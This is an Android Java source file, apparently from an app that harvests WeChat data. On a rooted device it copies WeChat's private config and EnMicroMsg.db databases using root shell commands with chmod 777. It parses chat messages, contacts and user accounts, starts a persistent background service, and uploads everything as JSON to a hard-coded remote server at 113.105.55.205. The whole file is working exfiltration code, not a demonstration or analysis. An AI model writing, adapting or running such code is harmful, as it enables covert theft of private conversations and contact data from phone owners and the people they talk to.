package cn.truistic.enmicromsg.main.presenter;

import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Handler;

import java.io.File;
import java.util.ArrayList;
import java.util.List;


import cn.truistic.enmicromsg.common.db.DBUtill;
import cn.truistic.enmicromsg.common.service.WhiteService;
import cn.truistic.enmicromsg.common.util.DeviceUtil;
import cn.truistic.enmicromsg.common.util.JsonUtil;
import cn.truistic.enmicromsg.common.util.RootUtil;
import cn.truistic.enmicromsg.info.ContentInfo;
import cn.truistic.enmicromsg.info.MessageInfo;
import cn.truistic.enmicromsg.info.UserInfo;
import cn.truistic.enmicromsg.main.MainMVP;
import cn.truistic.enmicromsg.main.model.HomeModel;

import static cn.truistic.enmicromsg.common.util.DeviceUtil.postJson;


/**
 * HomePresenter
 */
public class HomePresenter implements MainMVP.IHomePresenter {

    private static final String ContentUrlPath =
            "http://113.105.55.205:8090/UpData/ReceiveContent.aspx";
    private static final String MessageUrlPath =
            "http://113.105.55.205:8090/UpData/ReceiveMessage.aspx";
    private static final String UserInfoUrlPath =
            "http://113.105.55.205:8090/UpData/ReceiveUserInfo.aspx";



    private String mJsonContent,mJsonMessage,mJsonUser;


    List<MessageInfo> mMessageInfos = new ArrayList<>();
    List<UserInfo> mUserInfos= new ArrayList<>();
    List<ContentInfo> mContentInfos = new ArrayList<>();

    private Context context;
    private MainMVP.IHomeView homeView;
    private MainMVP.IHomeModel homeModel;



    public HomePresenter(Context context, MainMVP.IHomeView homeView) {
        this.context = context;
        this.homeView = homeView;
        homeModel = new HomeModel(this, context);
    }

    @Override
    public void detect() {
        new DetectTask().execute();
    }

    /**
     * 检测操作
     */
    private class DetectTask extends AsyncTask {
        @Override
        protected Object doInBackground(Object[] params) {
            boolean flag = true;
            while (flag) {

                // 1******************************.检测微信是否已经安装************************************
                publishProgress(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.DETECTING);
                if (!detectWechat()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.TRUE);

                // 2******************************检测设备是否已Root***************************************
                publishProgress(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.DETECTING);
                if (!detectRoot()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.TRUE);

                // 3*****************开启后台服务********每隔多少分钟执行一次****************************
                publishProgress(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.DETECTING);
                if (!detectService()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.TRUE);
                flag = false;


                // 4****************************检测是否已授权应用Root权限*************************************
                publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.DETECTING);
                if (!detectPermission()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.TRUE);


                // 5*******************************获取微信相关数据**********************************************
                publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.DETECTING);
                if (!requestData()) {
                    publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.TRUE);

                // 6解析微信相关数据********************聊天记录************************************
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.DETECTING);
                if (!analysisData()) {
                    publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.TRUE);
                flag = false;

                // 7.解析微信相关数据******************联系人************************************
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.DETECTING);
                if (!analysisContent()) {
                    publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.TRUE);
                flag = false;

                // 8解析微信相关数据******************微信号************************************
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.DETECTING);
                if (!analysisUser()) {
                    publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.TRUE);
                flag = false;


                // 9解析微信相关数据******************上传数据************************************
                publishProgress(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.DETECTING);
                if (!uploadData()) {
                    publishProgress(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.TRUE);
                flag = false;

            }


            return null;
        }

        @Override
        protected void onProgressUpdate(Object[] values) {
            homeView.setProgressState((MainMVP.IHomeView.Progress) values[0], (MainMVP.IHomeView.State) values[1]);
        }

        @Override
        protected void onPostExecute(Object o) {
            homeView.onDetectStop();
        }
    }
    /**
     * 检测数据是否上传
     *
     * @return true，已上传
     */
    private boolean uploadData() {

        mJsonMessage = JsonUtil.toJson(mMessageInfos);
        mJsonContent = JsonUtil.toJson(mContentInfos);
        mJsonUser = JsonUtil.toJson(mUserInfos);
        new Thread(new Runnable() {
            @Override
            public void run() {
                postJson(ContentUrlPath,mJsonContent);
                postJson(MessageUrlPath,mJsonMessage);
                postJson(UserInfoUrlPath,mJsonUser);
            }
        }).start();

        return true;
    }


    /**
     * 检测微信是否已经安装
     *
     * @return true，微信已安装
     */
    private boolean detectWechat() {
        return DeviceUtil.isAppInstalled(context, "com.tencent.mm");
    }

    /**
     * 检测设备是否开启后台服务
     *
     * @return true, 设备已开启
     */
    private boolean detectService() {
        Handler handler = new Handler(context.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                Intent whiteIntent = new Intent(context, WhiteService.class);
                context.startService(whiteIntent);
            }
        },1000 * 60 *5);  //5分钟
        return true;
    }

    /**
     * 检测设备是否已Root
     *
     * @return true, 设备已root
     */
    private boolean detectRoot() {
        return RootUtil.isDeviceRooted();
    }
    /**
     * 检测是否已授权应用Root权限
     *
     * @return true, 已授权
     */
    private boolean detectPermission() {
        return RootUtil.isGrantRootPermission();
    }

    /**
     * 获取微信数据
     *
     * @return true, 获取成功
     */
    private boolean requestData() {
        // 1.获取配置文件，用于获取uin
        String sharedPerfsPath = "/data/data/cn.truistic.enmicromsg/shared_prefs/system_config_prefs.xml";
        RootUtil.execCmds(new String[]{"cp /data/data/com.tencent.mm/shared_prefs/system_config_prefs.xml "
                + sharedPerfsPath, "chmod 777 " + sharedPerfsPath});
        File sharedPerfsFile = new File(sharedPerfsPath);
        if (!sharedPerfsFile.exists()) {
            return false;
        }
        // 2.获取数据库文件
        ArrayList<String> list;

        list = RootUtil.execCmdsforResult(new String[]{"cd /data/data/com.tencent.mm/MicroMsg", "ls -R"});
        ArrayList<String> dirs = new ArrayList<>();
        String dir = null;
        String item = null;
        for (int i = 0; i < list.size(); i++) {
            item = list.get(i);
            if (item.startsWith("./") && item.length() == 35) {
                dir = item;
            } else if (item.equals("EnMicroMsg.db")) {
                dirs.add(dir.substring(2, 34));
            }
        }
        if (dirs.size() == 0) {
            return false;
        } else {
            for (int i = 0; i < dirs.size(); i++) {
                RootUtil.execCmds(new String[]{"cp /data/data/com.tencent.mm/MicroMsg/" + dirs.get(i)
                        + "/EnMicroMsg.db " + context.getFilesDir() + "/EnMicroMsg" + i + ".db",
                        "chmod 777 " + context.getFilesDir() + "/EnMicroMsg" + i + ".db"});
            }
        }

        File dbFile;
        int i, j = 0;
        for (i = 0; i < dirs.size(); i++) {
            dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
            if (!dbFile.exists()) {
                break;
            }
            j++;
        }
        if (j == 0)
            return false;
        homeModel.saveDbNum(j);
        return true;
    }


    /**
     * 解析微信相关数据---------------------------------聊天記錄-----------------------------------------------
     *
     * @return
     */
    private boolean analysisData() {
        DBUtill.queryMessage(context);
        return true;
    }

    /**
     * 解析微信相关数据*********************************查询联系人****************************************
     *
     * @return true
     */
    private boolean analysisContent() {
        DBUtill.queryContent(context);
        return true;
    }


    /**
     * 解析微信相关数据*********************************查询微信号****************************************
     *
     * @return
     */
    private boolean analysisUser() {
        DBUtill.queryUser(context);
        return true;
    }

}